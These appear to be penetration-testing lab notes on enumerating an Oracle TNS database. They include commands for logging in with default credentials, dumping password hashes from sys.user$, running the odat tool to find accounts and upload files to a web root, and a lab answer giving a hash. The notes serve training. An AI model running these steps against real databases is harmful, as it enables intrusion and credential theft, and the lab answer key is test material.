Oracle TNS
The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks.
Initially introduced as part of the Oracle Net Services software suite, 
TNS supports various networking protocols between Oracle databases and client applications, such as IPX/SPX and TCP/IP protocol stacks.

Interacting with the service
Update pwnbox: `sudo apt update
sudo apt upgrade parrot-core
sudo apt update
sudo apt install oracle-instantclient-sqlplus`
Log in with sqlplus sqlplus scott/tiger@10.129.204.235/XE
Database enumeration: select * from user_role_privs;
Extract password hashes: select name, password from sys.user$;
File upload: ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt


Lab: Oracle TNS
Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
./odat.py all -s $TARGET


[+] Accounts found on 10.129.205.19:1521/sid:XE: 
scott/tiger

└──╼ [★]$ sqlplus scott/tiger@$TARGET/XE as sysdba

Answer: E066D214D5421CCC

